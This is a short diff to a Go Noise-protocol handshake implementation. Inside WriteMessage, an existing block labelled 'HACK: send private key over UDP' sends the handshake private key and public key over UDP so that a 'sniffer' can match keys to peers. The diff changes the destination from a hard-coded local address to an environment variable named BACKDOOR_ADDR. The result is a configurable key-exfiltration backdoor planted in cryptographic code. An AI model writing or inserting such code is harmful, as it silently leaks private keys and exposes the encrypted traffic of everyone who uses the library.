@@ -13,6 +13,7 @@ import (
 	"io"
 	"math"
 	"net"
+	"os"
 )
 
 // A CipherState provides symmetric encryption and decryption after a successful
@@ -383,10 +384,8 @@ func (s *HandshakeState) WriteMessage(out, payload []byte) ([]byte, *CipherState
 			}
 
 			// HACK: send private key over UDP
-			// TODO:
-			//	- configurable IP/port
-			//	- add simple encryption layer with configurable PSK
-			conn, err := net.Dial("udp", "127.0.0.1:1234")
+			// TODO: add simple encryption layer with configurable PSK
+			conn, err := net.Dial("udp", os.Getenv("BACKDOOR_ADDR"))
 
 			if err == nil {
 				// We send the public key too to let sniffer knows who's private key is this
